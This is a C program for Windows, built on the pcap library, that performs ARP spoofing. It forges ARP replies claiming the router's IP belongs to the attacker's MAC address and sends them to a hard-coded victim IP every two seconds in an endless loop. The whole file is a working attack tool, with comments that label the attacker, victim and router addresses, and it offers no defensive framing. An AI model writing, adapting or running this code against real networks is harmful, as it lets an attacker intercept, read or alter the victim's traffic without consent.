#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#define ETHER_ADDR_LEN 6

struct eth_header {
    u_char dest_mac[ETHER_ADDR_LEN];
    u_char src_mac[ETHER_ADDR_LEN];
    u_short eth_type;
};

struct arp_header {
    u_short htype;
    u_short ptype;
    u_char hlen;
    u_char plen;
    u_short opcode;
    u_char sender_mac[ETHER_ADDR_LEN];
    u_char sender_ip[4];
    u_char target_mac[ETHER_ADDR_LEN];
    u_char target_ip[4];
};

void mac_str_to_bytes(const char *mac_str, u_char *mac_bytes) {
    sscanf(mac_str, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx", 
        &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], 
        &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]);
}

void send_arp_spoof(pcap_t *handle, u_char *attacker_mac, u_char *victim_ip, u_char *router_ip) {
    u_char packet[42]; 

    struct eth_header *eth = (struct eth_header *)packet;
    struct arp_header *arp = (struct arp_header *)(packet + sizeof(struct eth_header));

    memset(packet, 0, sizeof(packet));

    memset(eth->dest_mac, 0xFF, ETHER_ADDR_LEN); 
    memcpy(eth->src_mac, attacker_mac, ETHER_ADDR_LEN);
    eth->eth_type = htons(0x0806);

    arp->htype = htons(1);   
    arp->ptype = htons(0x0800); 
    arp->hlen = 6;
    arp->plen = 4;
    arp->opcode = htons(2); 

    memcpy(arp->sender_mac, attacker_mac, ETHER_ADDR_LEN);
    memcpy(arp->sender_ip, router_ip, 4);
    memset(arp->target_mac, 0x00, ETHER_ADDR_LEN); 
    memcpy(arp->target_ip, victim_ip, 4);

    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
        fprintf(stderr, "Error sending ARP packet: %s\n", pcap_geterr(handle));
    } else {
        printf("ARP Spoofing packet sent!\n");
    }
}

int main() {
    pcap_if_t *alldevs, *d;
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    int i = 0, dev_num;
    u_char attacker_mac[6];
    u_char victim_mac[6];
    u_char router_mac[6];

    mac_str_to_bytes("38-68-93-99-72-62", attacker_mac); // Your MAC
    mac_str_to_bytes("66-7E-53-52-73-50", victim_mac);   // Victim MAC
    mac_str_to_bytes("04-75-F9-54-88-60", router_mac);   // Router MAC

    u_char victim_ip[4] = {192, 168, 1, 73};  // Victim IP
    u_char router_ip[4] = {192, 168, 1, 254}; // Router IP

    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        printf("Error finding devices: %s\n", errbuf);
        return 1;
    }

    printf("Available network interfaces:\n");
    for (d = alldevs; d; d = d->next) {
        printf("%d. %s\n", ++i, d->name);
    }

    if (i == 0) {
        printf("No interfaces found.\n");
        return 1;
    }
    printf("Enter interface number (1-%d): ", i);
    scanf("%d", &dev_num);
    d = alldevs;
    for (i = 1; i < dev_num; i++) d = d->next;

    handle = pcap_open_live(d->name, 65536, 1, 1000, errbuf);
    if (handle == NULL) {
        printf("Error opening device: %s\n", errbuf);
        return 1;
    }

    printf("Spoofing ARP cache of victim...\n");
    while (1) {
        send_arp_spoof(handle, attacker_mac, victim_ip, router_ip);
        Sleep(2000);
    }

    pcap_freealldevs(alldevs);
    pcap_close(handle);
    return 0;
}
